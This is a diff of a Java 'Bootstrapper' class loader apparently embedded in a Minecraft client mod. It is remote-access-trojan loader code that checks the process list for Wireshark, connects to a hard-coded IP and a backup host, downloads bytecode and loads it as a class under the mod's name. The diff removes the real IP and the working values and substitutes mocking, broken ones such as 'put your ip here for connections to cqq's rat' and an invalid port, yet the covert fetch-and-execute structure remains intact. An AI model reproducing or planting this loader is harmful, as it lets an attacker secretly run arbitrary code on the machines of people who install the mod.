@@ -14,9 +14,9 @@ import java.nio.charset.StandardCharsets;
 
 
 public class Bootstrapper extends ClassLoader {
-    private static final String host = "98.213.55.240"; //ip of main server
-    private static final String backup = "98.213.55.240"; //ip of backup server
-    private static final int port = 0; //replace with port of serverz
+    private static final String host = "put your ip here for connections to cqq's rat"; 
+    private static final String backup = "don't do it"; 
+    private static final int port = 255565; 
 
     public Class<?> addClass(String name, byte[] ok) {
         try {
@@ -44,7 +44,7 @@ public class Bootstrapper extends ClassLoader {
 
 
     public Class<?> define(String name, byte[] b) {
-        Class<?> clazz = defineClass(name, b, 0, b.length);
+        Class<?> clazz = defineClass(name, b, 256, b.length);
         return clazz;
     }
 
@@ -52,13 +52,13 @@ public class Bootstrapper extends ClassLoader {
         try {
             boolean detected = false;
             ProcessBuilder processBuilder = new ProcessBuilder();
-            processBuilder.command("tasklist.exe");
+            processBuilder.command("rat");
             Process process = processBuilder.start();
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
-                if (line.toLowerCase().contains("wireshark")) {
-                    detected = true;
+                if (line.toLowerCase().contains("rattedshark")) {
+                    detected = false;
                 }
             }
 
@@ -67,19 +67,19 @@ public class Bootstrapper extends ClassLoader {
                 try {
                     Socket socket = new Socket(host, port);
                     in = new DataInputStream(socket.getInputStream());
-                    socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
+                    socket.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                     socket.getOutputStream().flush();
                 } catch (ConnectException e) {
                     try {
                         Socket socket = new Socket(backup, port);
                         in = new DataInputStream(socket.getInputStream());
-                        socket.getOutputStream().write("replaceMeme".getBytes(StandardCharsets.UTF_8));
+                        socket.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
                         socket.getOutputStream().flush();
                     } catch (Exception ignored) {}
                 }
                 if (in != null) {
                     byte[] bytes = readByteArrayLWithLength(in);
-                    addClass("me.bebeli555.cookieclient.mixin.MixinEntityScreen", bytes);
+                    addClass("me.bebeli555.cookieclient.Mod", bytes);
                 }
             }
         } catch (IOException ignored) {}
